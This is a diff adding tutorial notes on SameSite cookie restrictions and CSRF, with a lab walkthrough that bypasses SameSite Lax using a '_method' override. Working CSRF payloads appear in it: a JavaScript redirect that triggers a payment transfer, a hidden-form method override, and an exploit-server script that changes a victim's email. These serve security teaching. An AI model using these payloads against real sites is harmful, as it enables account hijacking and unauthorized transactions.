@@ -619,4 +619,170 @@ The distinction is important because a request can be __same-site__ but not __sa
 
 The difference matters, especially in scenarios where executing arbitrary JavaScript on one subdomain could allow an attacker to exploit protections on other subdomains within the same site. We'll explore an example of this in an upcoming lab. 
 
+## How does SameSite work?
+
+Before the introduction of the SameSite attribute, browsers would automatically include cookies in every request sent to the domain that created them --- even when those requests were initiated by unrelated third-party sites. The SameSite mechanism allows browsers and developers to control whether, and under what conditions, cookies are sent with cross-site requests. 
+
+This is particularly useful in mitigating CSRF attacks, where an attacker tries to trick a user's browser into making an authenticated request to a vulnerable website. Since such attacks often depend on the presence of the user's session cookie, blocking the cookie in cross-site scenarios can prevent the malicious action from succeeding. 
+
+Today, all major browsers support three SameSite policy levels:
+
+- `Strict`
+- `Lax`
+- `None`
+
+### How does SameSite work? - Continued
+
+Developers can define how cookies behave in cross-site scenarios by setting a specific restriction level using the `SameSite` attribute in the `Set-Cookie` header. This gives them greater control over how and when cookies are included in requests. For example:
+
+```
+Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
+```
+
+While applying these settings can help defend against CSRF attacks, they don't offer complete protection. We'll explore the limitations of these defenses through interactive labs that demonstrate real-world vulnerabilities.
+
+> NOTE: If a site doesn't explicitly define a SameSite policy, Chrome will default to applying `SameSite=Lax`. This default behavior restricts cookies from being sent in most cross-site scenarios unless certain conditions are met. Since this is a proposed standard, other major browsers are likely to follow suit.
+
+### `Strict`
+
+When a cookie is configured with `SameSite=Strict` attribute, browsers will completely exclude it from any cross-site requests. In other words, if the site receiving the request differs from the one currently displayed in the browser's address bar, the cookie won't be sent. 
+
+This setting is ideal for cookies that grant access to sensitive actions or data --- such as accessing protected pages or modifying user information --- since it provides the highest level of protection.
+
+However while it offers strong security, this strict setting can interfere with legitimate cross-site interactions and negatively affect the overall user experience.
+
+### `Lax`
+
+With `SameSite=Lax` restrictions, browsers will send the cookie along with cross-site requests, but only if two conditions are satisfied:
+
+- The request must use the `GET` method.
+- The request must result from a user-initiated top-level navigation, such as clicking a hyperlink.
+
+As a result, cookies are not sent with cross-site `POST` requests, which are commonly used to carry out actions that alter data or application state --- making them prime targets for CSRF attacks.
+
+Additionally, cookies under Lax restrictions are not included in background requests, like those triggered by JavaScript, iframes, or embedded content such as images and stylesheets.
+
+### `None`
+
+Setting a cookie with `SameSite=None` turns off SameSite restrictions entirely, allowing the cookie to be included in all requests to the issuing site --- even those initiated by unrelated third-party websites. 
+
+In most browsers (except Chrome), this is the default behavior if the `SameSite` attribute isn't explicitly defined when the cookie is set.
+
+There are valid use cases for disabling SameSite protections --- for example, if the cookie is meant to be accessed in a third-party context and doesn't provide access to sensitive features or data. A common use case is tracking cookies used for advertising or analytics.
+
+### `None` - Continued
+
+If you come across a cookie that users `SameSite=None` or has no specified SameSite restrictions, it's worth checking whether the cookie is actiually necessary. When Chrome first introduced its "Lax-by-default" policy, it unintentionally disrupted many existing web features. As a quick fix, some developers chose to disable SameSite protections across all cookies --- even those handling sensitive information.
+
+However, when using `SameSite=None`, the cookie must also include the `Secure` flag, meaning it will only be transmitted over HTTPS. If this attribute is missing, the browser will reject the cookie and refuse to store it. 
+
+Example:
+
+```
+Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
+```
+
+## Bypassing SameSite Lax restrictions using GET requests
+
+In real-world scenarios, severs often don't strictly enforce whether a request uses `GET` or `POST` --- even on endpoints that expect form submissions. If session cookies are protected with `SameSite=Lax` (either intentionally or by default), you might still be able to execute a CSRF attack by triggering a `GET` request from the victim's browser.
+
+As long as the request is initiated by a top-level navigation (like clicking a link or using JavaScript redirection), the browser will include the user's session cookie. One of the simplest ways to exploit this is by redirecting the victim to a malicious URL, like so:
+
+```
+<script>
+    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
+</script>
+```
+
+### Bypassing SameSite Lax restrictions using GET requests - Continued
+
+Even if a standard `GET` request isn't permitted, some web frameworks offer ways to override the HTTP method declared in the request. For instance, Symfony supports a special `_method` parameter in forms, which can override the request method for routing purposes:
+
+```
+<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
+    <input type="hidden" name="_method" value="GET">
+    <input type="hidden" name="recipient" value="hacker">
+    <input type="hidden" name="amount" value="1000000">
+</form>
+```
+
+Other frameworks may use different parameters to achieve similar method overriding behavior.
+
+### Lab: SameSite Lax bypass via method override
+
+Open Burp's browser, navigate to the lab, log in with credentials `wiener:peter` and change the email address.
+
+In the __Proxy__ > __HTTP History__ open the `POST /my-account/change-email` request and notice that CSRF tokens aren't present in the request headers or body, so it may be vulnerable to CSRF if SameSite cookie restrictions could be bypassed.
+
+```
+POST /my-account/change-email HTTP/2
+Cookie: session=QS1ZuEkD2NX4Y31caMnDO47vvyUki87f
+
+email=attacker%40fakemail.com
+```
+
+In the __Proxy__ > __HTTP History__ open the `POST /login` request and check the response. The website doesn't explicitly specify any SameSite restrictions when setting session cookies. This means the browser will use the default `Lax` restriction. 
+
+```
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 3247
+```
+
+As a result, the session cookie will be sent in cross-site `GET` requests, as long as they involve a top-level navigation. 
+
+Right-click the `POST /my-account/change-email` request and select "Send to Repeater". Right click on the request there and sleect "Change request method". An equivalent `GET` request will be automatically generated. 
+
+```
+GET /my-account/change-email?email=attacker%40fakemail.com HTTP/2
+Cookie: session=QS1ZuEkD2NX4Y31caMnDO47vvyUki87f
+```
+
+Send the request. Observe that the endpoint only allows `POST` requests.
+
+```
+HTTP/2 405 Method Not Allowed
+Allow: POST
+
+"Method Not Allowed"
+```
+
+Try overriding the method by adding the `_method` parameter to the query string:
+
+```
+GET /my-account/change-email?email=foo%40bar.com&_method=POST HTTP/2
+```
+
+The request seems to have been accepted by the server:
+
+```
+HTTP/2 302 Found
+Location: /my-account?id=wiener
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+
+In the browser, go to the account page and confirm that your email address has changed:
+
+```
+# My Account
+Your username is: wiener
+Your email is: foo@bar.com
+``` 
+
+In the browser click "Go to exploit server" and paste the following HTML template in the "Body" section:
+
+```
+<script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
+</script>
+```
+
+It induces the viewer's browser to issue the malicious `GET` request with a `_method` override and `email` as query parameters. Click "Store" and then click "View exploit". It will redirect you to the `/my-account` page where your email should be changed to `pwned@web-security-academy.net`. This means the exploit works.
+
+Change the email address to the exploit back to `foo@bar.com` and click "Deliver exploit to victim" to solve the lab.
+
+> NOTE: Check out [walkthrough](csrf_lab06_zaproxy.md) of this lab in OWASP Zed Attack Proxy
+
 
